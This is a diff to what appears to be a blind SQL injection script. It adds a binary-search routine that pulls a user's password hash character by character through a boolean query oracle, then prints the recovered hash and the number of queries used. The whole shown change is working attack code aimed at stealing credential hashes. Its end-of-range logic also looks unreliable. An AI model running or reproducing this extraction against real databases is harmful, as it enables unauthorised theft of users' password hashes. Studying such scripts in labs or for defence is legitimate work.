@@ -36,6 +36,26 @@ def extract_hash(charset,user_id, password_length):
                 break
     return found
 
+def extract_hash_bst(charset, user_id, password_length):
+    found=""
+    for index in range(0, password_length):
+        start=0
+        end= len(charset)-1
+        while start<=end:
+            if end-start==1:
+                if start==0 and boolean_query(index, user_id, charset[start]):
+                    found+=charset[start]
+                else:
+                    found+=charset[start+1]
+                break
+            else:
+                middle=(start+end)//2
+                if boolean_query(index, user_id, charset[middle]):
+                    end=middle
+                else:
+                    start=middle
+    return found
+
 def total_queries_taken():
     global total_queries
     print("\t\t[!] {} tottal queries!".format(total_queries))
@@ -50,10 +70,15 @@ while True:
             total_queries_taken()
             print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id),user_password_length)))
             total_queries_taken()
+            print("\t[-] User {} hash: {}".format(user_id,extract_hash_bst(charset, int(user_id), user_password_length)))
+            total_queries_taken()
         else:
             print("\t[X] User {} does not exist!".format(user_id))
     except KeyboardInterrupt:
         break
+        
+        
+                
         
         
                 
